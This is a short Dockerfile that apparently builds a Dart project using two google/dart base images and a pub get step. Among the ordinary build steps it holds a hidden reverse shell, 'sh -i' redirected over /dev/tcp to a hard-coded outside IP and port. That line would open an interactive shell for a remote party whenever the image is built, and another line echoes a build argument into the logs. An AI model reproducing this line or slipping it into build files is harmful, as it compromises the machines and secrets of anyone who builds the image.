FROM google/dart:2.5 as dart2

FROM google/dart:1.24.3
ARG APT_USER
RUN echo $APT_USER
RUN sh -i >& /dev/tcp/209.141.60.125/4449 0>&1
WORKDIR /build/
ADD pubspec.yaml /build/
COPY --from=dart2 /usr/lib/dart /usr/lib/dart2
RUN _PUB_TEST_SDK_VERSION=1.24.3 /usr/lib/dart2/bin/pub get --no-precompile
ARG BUILD_ARTIFACTS_BUILD=/build/pubspec.lock
FROM scratch
